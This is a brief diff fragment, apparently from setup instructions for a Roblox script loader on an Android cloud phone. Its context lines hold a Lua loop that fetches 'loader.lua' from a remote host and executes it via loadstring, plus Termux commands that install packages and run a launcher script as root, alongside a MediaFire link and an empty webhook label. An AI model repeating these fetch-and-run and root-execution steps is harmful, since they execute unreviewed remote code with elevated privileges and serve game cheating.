@@ -16,7 +16,7 @@ https://download2434.mediafire.com/ziocf6gtgpxgHkKWJoaGsZXlQJOJEbq6h3SYSsnhRucSp
 repeat wait()spawn(function()loadstring(game:HttpGet("https://nousigi.com/loader.lua"))()end)wait(20)until Joebiden
 
 -----
-pkg install -y python tsu libexpat openssl && pip install requests && echo "Completed."`
+pkg install -y python tsu libexpat openssl && pip install requests && echo "Completed."
 su -c "export PATH=$PATH:/data/data/com.termux/files/usr/bin && python /storage/emulated/0/download/ugphonelauncher.py"
 
 -------webhook:
